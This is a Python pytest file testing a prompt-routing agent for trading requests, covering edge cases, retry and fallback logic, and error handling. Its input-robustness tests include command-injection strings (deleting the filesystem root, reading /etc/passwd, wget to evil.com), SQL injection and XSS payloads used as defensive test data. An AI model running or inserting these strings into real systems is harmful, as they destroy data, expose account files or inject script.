"""
Tests for Prompt Agent

Comprehensive tests including edge cases, invalid prompts, and error handling.
"""

from unittest.mock import patch

import pytest

from agents.prompt_agent import (
    PromptAgent,
    RequestType,
)


class TestPromptAgent:
    """Test cases for PromptAgent."""

    def setup_method(self):
        """Set up test fixtures."""
        self.agent = PromptAgent(
            use_regex_first=True, use_local_llm=False, use_openai_fallback=False
        )

    def test_empty_prompt(self):
        """Test handling of empty prompts."""
        result = self.agent.route_request("")

        assert result.request_type == RequestType.GENERAL
        assert result.primary_agent == "GeneralAgent"
        assert result.confidence == 0.1
        assert "No strategy detected" in result.metadata["message"]

    def test_none_prompt(self):
        """Test handling of None prompts."""
        result = self.agent.route_request(None)

        assert result.request_type == RequestType.GENERAL
        assert result.primary_agent == "GeneralAgent"
        assert result.confidence == 0.1

    def test_whitespace_only_prompt(self):
        """Test handling of whitespace-only prompts."""
        result = self.agent.route_request("   \n\t   ")

        assert result.request_type == RequestType.GENERAL
        assert result.primary_agent == "GeneralAgent"
        assert result.confidence == 0.1

    def test_invalid_prompt_with_special_chars(self):
        """Test handling of prompts with special characters."""
        invalid_prompts = [
            "!@#$%^&*()",
            "prompt with <script>alert('xss')</script>",
            "prompt with 'quotes' and \"double quotes\"",
            "prompt\nwith\nnewlines\nand\ttabs",
        ]

        for prompt in invalid_prompts:
            result = self.agent.route_request(prompt)
            assert result.request_type == RequestType.GENERAL
            assert result.primary_agent == "GeneralAgent"

    def test_repeated_keywords(self):
        """Test handling of prompts with repeated keywords."""
        repeated_prompts = [
            "forecast forecast forecast AAPL",
            "strategy strategy strategy RSI",
            "analyze analyze analyze market",
            "buy buy buy sell sell",
        ]

        for prompt in repeated_prompts:
            result = self.agent.route_request(prompt)
            # Should still route to appropriate agent despite repetition
            assert result.request_type != RequestType.UNKNOWN
            assert result.primary_agent != "GeneralAgent"

    def test_contradictory_instructions(self):
        """Test handling of contradictory instructions."""
        contradictory_prompts = [
            "buy and sell AAPL",
            "conservative aggressive strategy",
            "short term long term forecast",
            "high frequency infrequent trading",
        ]

        for prompt in contradictory_prompts:
            result = self.agent.route_request(prompt)
            # Should still route despite contradictions
            assert result.request_type != RequestType.UNKNOWN
            assert result.primary_agent != "GeneralAgent"

    def test_very_long_prompt(self):
        """Test handling of very long prompts."""
        long_prompt = "forecast " * 1000  # Very long prompt
        result = self.agent.route_request(long_prompt)

        assert result.request_type == RequestType.FORECAST
        assert result.primary_agent != "GeneralAgent"

    def test_prompt_with_numbers_and_symbols(self):
        """Test handling of prompts with numbers and symbols."""
        numeric_prompts = [
            "forecast AAPL for 7 days",
            "RSI strategy with period 14",
            "MACD with 12, 26, 9 parameters",
            "analyze stock price $150.50",
        ]

        for prompt in numeric_prompts:
            result = self.agent.route_request(prompt)
            assert result.request_type != RequestType.UNKNOWN
            assert result.primary_agent != "GeneralAgent"

    def test_mixed_language_prompt(self):
        """Test handling of mixed language prompts."""
        mixed_prompts = [
            "forecast AAPL maÃ±ana",
            "RSI strategy pour AAPL",
            "analyze marchÃ© for AAPL",
        ]

        for prompt in mixed_prompts:
            result = self.agent.route_request(prompt)
            # Should still extract English keywords
            assert result.request_type != RequestType.UNKNOWN

    def test_prompt_with_emojis(self):
        """Test handling of prompts with emojis."""
        emoji_prompts = [
            "ðŸ“ˆ forecast AAPL ðŸ“Š",
            "ðŸ’° RSI strategy ðŸ’¸",
            "ðŸŽ¯ analyze market ðŸŽ²",
        ]

        for prompt in emoji_prompts:
            result = self.agent.route_request(prompt)
            assert result.request_type != RequestType.UNKNOWN

    def test_prompt_with_urls(self):
        """Test handling of prompts with URLs."""
        url_prompts = [
            "forecast AAPL from https://finance.yahoo.com",
            "analyze data from http://example.com",
            "strategy based on www.tradingview.com",
        ]

        for prompt in url_prompts:
            result = self.agent.route_request(prompt)
            assert result.request_type != RequestType.UNKNOWN

    def test_prompt_with_unicode(self):
        """Test handling of prompts with unicode characters."""
        unicode_prompts = [
            "forecast AAPL Î±Î²Î³Î´Îµ",
            "RSI strategy ä¸­æ–‡",
            "analyze market cafÃ©",
        ]

        for prompt in unicode_prompts:
            result = self.agent.route_request(prompt)
            assert result.request_type != RequestType.UNKNOWN

    def test_prompt_with_html_tags(self):
        """Test handling of prompts with HTML tags."""
        html_prompts = [
            "forecast <b>AAPL</b>",
            "RSI <i>strategy</i>",
            "analyze <div>market</div>",
        ]

        for prompt in html_prompts:
            result = self.agent.route_request(prompt)
            assert result.request_type != RequestType.UNKNOWN

    def test_prompt_with_sql_injection(self):
        """Test handling of prompts with SQL injection attempts."""
        sql_prompts = [
            "forecast AAPL'; DROP TABLE users; --",
            "RSI strategy OR 1=1",
            "analyze market UNION SELECT * FROM data",
        ]

        for prompt in sql_prompts:
            result = self.agent.route_request(prompt)
            # Should still route despite injection attempts
            assert result.request_type != RequestType.UNKNOWN

    def test_prompt_with_command_injection(self):
        """Test handling of prompts with command injection attempts."""
        command_prompts = [
            "forecast AAPL; rm -rf /",
            "RSI strategy && cat /etc/passwd",
            "analyze market | wget http://evil.com",
        ]

        for prompt in command_prompts:
            result = self.agent.route_request(prompt)
            # Should still route despite injection attempts
            assert result.request_type != RequestType.UNKNOWN

    def test_prompt_with_xss_attempts(self):
        """Test handling of prompts with XSS attempts."""
        xss_prompts = [
            "forecast AAPL<script>alert('xss')</script>",
            "RSI strategy<img src=x onerror=alert('xss')>",
            "analyze market<svg onload=alert('xss')>",
        ]

        for prompt in xss_prompts:
            result = self.agent.route_request(prompt)
            assert result.request_type != RequestType.UNKNOWN

    def test_prompt_with_very_short_words(self):
        """Test handling of prompts with very short words."""
        short_prompts = ["a b c d e", "x y z", "1 2 3"]

        for prompt in short_prompts:
            result = self.agent.route_request(prompt)
            assert result.request_type == RequestType.GENERAL
            assert result.primary_agent == "GeneralAgent"

    def test_prompt_with_only_numbers(self):
        """Test handling of prompts with only numbers."""
        number_prompts = ["123 456 789", "1.23 4.56 7.89", "100 200 300"]

        for prompt in number_prompts:
            result = self.agent.route_request(prompt)
            assert result.request_type == RequestType.GENERAL
            assert result.primary_agent == "GeneralAgent"

    def test_prompt_with_only_symbols(self):
        """Test handling of prompts with only symbols."""
        symbol_prompts = ["!@#$%^&*()", "+=[]{}|\\", "~`<>?/"]

        for prompt in symbol_prompts:
            result = self.agent.route_request(prompt)
            assert result.request_type == RequestType.GENERAL
            assert result.primary_agent == "GeneralAgent"

    def test_prompt_with_malformed_json(self):
        """Test handling of prompts with malformed JSON."""
        malformed_json_prompts = [
            'forecast AAPL {"invalid": json}',
            'strategy {"missing": "quotes}',
            'analyze {"unclosed": "brace"',
        ]

        for prompt in malformed_json_prompts:
            result = self.agent.route_request(prompt)
            assert result.request_type != RequestType.UNKNOWN

    def test_prompt_with_nested_quotes(self):
        """Test handling of prompts with nested quotes."""
        nested_quote_prompts = [
            "forecast AAPL with \"nested 'quotes'\"",
            "strategy with 'nested \"quotes\"'",
            "analyze \"complex 'quote 'nested' structure'\"",
        ]

        for prompt in nested_quote_prompts:
            result = self.agent.route_request(prompt)
            assert result.request_type != RequestType.UNKNOWN

    def test_prompt_with_backslashes(self):
        """Test handling of prompts with backslashes."""
        backslash_prompts = [
            "forecast AAPL\\nwith\\tbackslashes",
            "strategy\\r\\nwith\\vbackslashes",
            "analyze\\fmarket\\awith\\bbackslashes",
        ]

        for prompt in backslash_prompts:
            result = self.agent.route_request(prompt)
            assert result.request_type != RequestType.UNKNOWN

    def test_prompt_with_control_characters(self):
        """Test handling of prompts with control characters."""
        control_char_prompts = [
            "forecast\x00AAPL\x01with\x02control\x03chars",
            "strategy\x04with\x05control\x06chars\x07",
            "analyze\x08market\x09with\x0acontrol\x0bchars",
        ]

        for prompt in control_char_prompts:
            result = self.agent.route_request(prompt)
            assert result.request_type != RequestType.UNKNOWN

    def test_prompt_with_very_long_words(self):
        """Test handling of prompts with very long words."""
        long_word_prompts = [
            "forecast " + "A" * 1000 + "AAPL",
            "strategy " + "B" * 500 + "RSI",
            "analyze " + "C" * 750 + "market",
        ]

        for prompt in long_word_prompts:
            result = self.agent.route_request(prompt)
            assert result.request_type != RequestType.UNKNOWN

    def test_prompt_with_zero_width_characters(self):
        """Test handling of prompts with zero-width characters."""
        zero_width_prompts = [
            "forecast\u200bAAPL\u200cwith\u200dzero\u2060width",
            "strategy\u2061with\u2062zero\u2063width\u2064chars",
            "analyze\u2065market\u2066with\u2067zero\u2068width",
        ]

        for prompt in zero_width_prompts:
            result = self.agent.route_request(prompt)
            assert result.request_type != RequestType.UNKNOWN

    def test_prompt_with_right_to_left_text(self):
        """Test handling of prompts with right-to-left text."""
        rtl_prompts = [
            "forecast AAPL \u202bwith RTL text\u202c",
            "strategy \u202bRSI with RTL\u202c",
            "analyze \u202bmarket RTL\u202c",
        ]

        for prompt in rtl_prompts:
            result = self.agent.route_request(prompt)
            assert result.request_type != RequestType.UNKNOWN

    def test_prompt_with_combining_characters(self):
        """Test handling of prompts with combining characters."""
        combining_prompts = [
            "forecast A\u0300A\u0301P\u0302L\u0303",
            "strategy R\u0304S\u0305I\u0306",
            "analyze m\u0307a\u0308r\u0309k\u030aet",
        ]

        for prompt in combining_prompts:
            result = self.agent.route_request(prompt)
            assert result.request_type != RequestType.UNKNOWN

    def test_prompt_with_private_use_characters(self):
        """Test handling of prompts with private use characters."""
        private_use_prompts = [
            "forecast AAPL\ue000with\ue001private\ue002use",
            "strategy\ue003RSI\ue004with\ue005private\ue006use",
            "analyze\ue007market\ue008with\ue009private\ue00ause",
        ]

        for prompt in private_use_prompts:
            result = self.agent.route_request(prompt)
            assert result.request_type != RequestType.UNKNOWN

    def test_prompt_with_surrogate_pairs(self):
        """Test handling of prompts with surrogate pairs."""
        surrogate_prompts = [
            "forecast AAPL\ud800\udc00with\ud800\udc01surrogate",
            "strategy\ud800\udc02RSI\ud800\udc03with\ud800\udc04surrogate",
            "analyze\ud800\udc05market\ud800\udc06with\ud800\udc07surrogate",
        ]

        for prompt in surrogate_prompts:
            result = self.agent.route_request(prompt)
            assert result.request_type != RequestType.UNKNOWN


class TestPromptAgentRetryLogic:
    """Test cases for retry logic and fallback mechanisms."""

    def setup_method(self):
        """Set up test fixtures."""
        self.agent = PromptAgent(
            use_regex_first=True,
            use_local_llm=False,
            use_openai_fallback=False,
            max_retries=2,
            retry_backoff_factor=1.5,
            retry_delay_seconds=0.1,
        )

    def test_null_input_handling(self):
        """Test handling of null inputs."""
        # Test None prompt
        result = self.agent.parse_intent(None)
        assert result.intent == "general"
        assert result.confidence == 0.1
        assert result.error == "Empty or None prompt provided"

        # Test empty string
        result = self.agent.parse_intent("")
        assert result.intent == "general"
        assert result.confidence == 0.1
        assert result.error == "Empty or None prompt provided"

        # Test whitespace only
        result = self.agent.parse_intent("   \n\t   ")
        assert result.intent == "general"
        assert result.confidence == 0.1
        assert result.error == "Empty or None prompt provided"

    def test_unknown_model_handling(self):
        """Test handling of unknown model requests."""
        # Test with non-existent model
        result = self.agent.parse_intent("forecast AAPL using nonexistent_model")

        # Should fall back to regex parsing
        assert result.provider == "regex"
        assert result.intent in ["forecast", "general"]
        assert result.confidence > 0

    def test_retry_fallback_mechanism(self):
        """Test retry and fallback mechanisms."""
        # Mock a failing provider
        with patch.object(
            self.agent, "parse_intent_regex", side_effect=Exception("Regex failed")
        ):
            result = self.agent.parse_intent("forecast AAPL")

            # Should still return a result from fallback
            assert result is not None
            assert result.intent == "general"
            assert result.provider == "regex"

    def test_retry_backoff_timing(self):
        """Test retry backoff timing."""
        import time

        # Mock a provider that fails twice then succeeds
        call_count = 0

        def mock_provider(prompt):
            nonlocal call_count
            call_count += 1
            if call_count < 3:
                raise Exception(f"Provider failed attempt {call_count}")
            return self.agent._basic_regex_fallback(prompt)

        with patch.object(self.agent, "parse_intent_regex", side_effect=mock_provider):
            start_time = time.time()
            result = self.agent.parse_intent("forecast AAPL")
            end_time = time.time()

            # Should have retried with backoff
            assert call_count == 3
            assert result is not None
            # Timing should include backoff delays
            assert end_time - start_time >= 0.1 + 0.15  # Initial delay + backoff

    def test_max_retries_exceeded(self):
        """Test behavior when max retries are exceeded."""
        # Mock a provider that always fails
        with patch.object(
            self.agent, "parse_intent_regex", side_effect=Exception("Always fails")
        ):
            result = self.agent.parse_intent("forecast AAPL")

            # Should return fallback result
            assert result is not None
            assert result.provider == "regex"
            assert result.intent == "general"

    def test_malformed_response_handling(self):
        """Test handling of malformed responses."""

        # Mock a provider that returns malformed response
        def mock_malformed_response(prompt):
            return None  # Malformed response

        with patch.object(
            self.agent, "parse_intent_regex", side_effect=mock_malformed_response
        ):
            result = self.agent.parse_intent("forecast AAPL")

            # Should handle malformed response and retry
            assert result is not None
            assert result.provider == "regex"

    def test_performance_metrics_tracking(self):
        """Test that retry attempts are tracked in performance metrics."""
        # Mock a provider that fails
        with patch.object(
            self.agent, "parse_intent_regex", side_effect=Exception("Test failure")
        ):
            initial_retries = self.agent.performance_metrics["retry_attempts"]
            initial_fallbacks = self.agent.performance_metrics["fallback_usage"]

            result = self.agent.parse_intent("forecast AAPL")

            # Should have incremented retry and fallback counters
            assert self.agent.performance_metrics["retry_attempts"] > initial_retries
            assert self.agent.performance_metrics["fallback_usage"] > initial_fallbacks

    def test_provider_fallback_chain(self):
        """Test the provider fallback chain."""
        # Test with all providers enabled
        agent = PromptAgent(
            use_regex_first=True,
            use_local_llm=True,
            use_openai_fallback=True,
            max_retries=1,
        )

        # Mock all providers to fail
        with (
            patch.object(
                agent, "parse_intent_regex", side_effect=Exception("Regex failed")
            ),
            patch.object(
                agent, "parse_intent_huggingface", side_effect=Exception("HF failed")
            ),
            patch.object(
                agent, "parse_intent_openai", side_effect=Exception("OpenAI failed")
            ),
        ):

            result = agent.parse_intent("forecast AAPL")

            # Should return fallback result
            assert result is not None
            assert result.provider == "regex"

    def test_retry_configuration(self):
        """Test retry configuration parameters."""
        # Test custom retry configuration
        agent = PromptAgent(
            max_retries=5, retry_backoff_factor=3.0, retry_delay_seconds=0.5
        )

        assert agent.max_retries == 5
        assert agent.retry_backoff_factor == 3.0
        assert agent.retry_delay_seconds == 0.5


class TestPromptAgentIntegration:
    """Integration tests for PromptAgent."""

    def setup_method(self):
        """Set up test fixtures."""
        self.agent = PromptAgent(
            use_regex_first=True, use_local_llm=False, use_openai_fallback=False
        )

    def test_forecast_prompt_routing(self):
        """Test routing of forecast prompts."""
        forecast_prompts = [
            "forecast AAPL for next week",
            "predict TSLA price movement",
            "what will be the future price of MSFT",
        ]

        for prompt in forecast_prompts:
            result = self.agent.route_request(prompt)
            assert result.request_type == RequestType.FORECAST
            assert (
                "Forecast" in result.primary_agent
                or "forecast" in result.primary_agent.lower()
            )

    def test_strategy_prompt_routing(self):
        """Test routing of strategy prompts."""
        strategy_prompts = [
            "create RSI strategy for AAPL",
            "build MACD trading strategy",
            "develop Bollinger Bands strategy",
        ]

        for prompt in strategy_prompts:
            result = self.agent.route_request(prompt)
            assert result.request_type == RequestType.STRATEGY
            assert (
                "Strategy" in result.primary_agent
                or "strategy" in result.primary_agent.lower()
            )

    def test_analysis_prompt_routing(self):
        """Test routing of analysis prompts."""
        analysis_prompts = [
            "analyze AAPL performance",
            "examine TSLA market data",
            "review MSFT financials",
        ]

        for prompt in analysis_prompts:
            result = self.agent.route_request(prompt)
            assert result.request_type == RequestType.ANALYSIS
            assert (
                "Analysis" in result.primary_agent
                or "analysis" in result.primary_agent.lower()
            )

    def test_investment_prompt_routing(self):
        """Test routing of investment prompts."""
        investment_prompts = [
            "what should I invest in today",
            "which stocks to buy now",
            "recommend best stocks for investment",
        ]

        for prompt in investment_prompts:
            result = self.agent.route_request(prompt)
            assert result.request_type == RequestType.INVESTMENT
            assert (
                "Investment" in result.primary_agent
                or "investment" in result.primary_agent.lower()
            )


class TestPromptAgentErrorHandling:
    """Test error handling in PromptAgent."""

    def setup_method(self):
        """Set up test fixtures."""
        self.agent = PromptAgent(
            use_regex_first=True, use_local_llm=False, use_openai_fallback=False
        )

    @patch("agents.prompt_agent.PromptAgent._find_suitable_agents")
    def test_no_suitable_agents_found(self, mock_find_agents):
        """Test handling when no suitable agents are found."""
        mock_find_agents.return_value = []

        result = self.agent.route_request("forecast AAPL")

        assert result.request_type == RequestType.FORECAST
        assert result.primary_agent == "GeneralAgent"
        assert result.confidence < 0.5

    @patch("agents.prompt_agent.PromptAgent._calculate_routing_confidence")
    def test_confidence_calculation_error(self, mock_confidence):
        """Test handling of confidence calculation errors."""
        mock_confidence.side_effect = Exception("Confidence calculation failed")

        result = self.agent.route_request("forecast AAPL")

        assert result.request_type == RequestType.FORECAST
        assert result.confidence == 0.1  # Default confidence

    def test_memory_error_handling(self):
        """Test handling of memory-related errors."""
        # Test with corrupted memory
        with patch.object(
            self.agent.memory, "store", side_effect=Exception("Memory error")
        ):
            result = self.agent.route_request("forecast AAPL")

            # Should still work despite memory error
            assert result.request_type == RequestType.FORECAST
            assert result.primary_agent != "GeneralAgent"

    def test_logging_error_handling(self):
        """Test handling of logging errors."""
        # Test with logging failure
        with patch(
            "agents.prompt_agent.logger.error", side_effect=Exception("Logging failed")
        ):
            result = self.agent.route_request("forecast AAPL")

            # Should still work despite logging error
            assert result.request_type == RequestType.FORECAST
            assert result.primary_agent != "GeneralAgent"


if __name__ == "__main__":
    pytest.main([__file__])
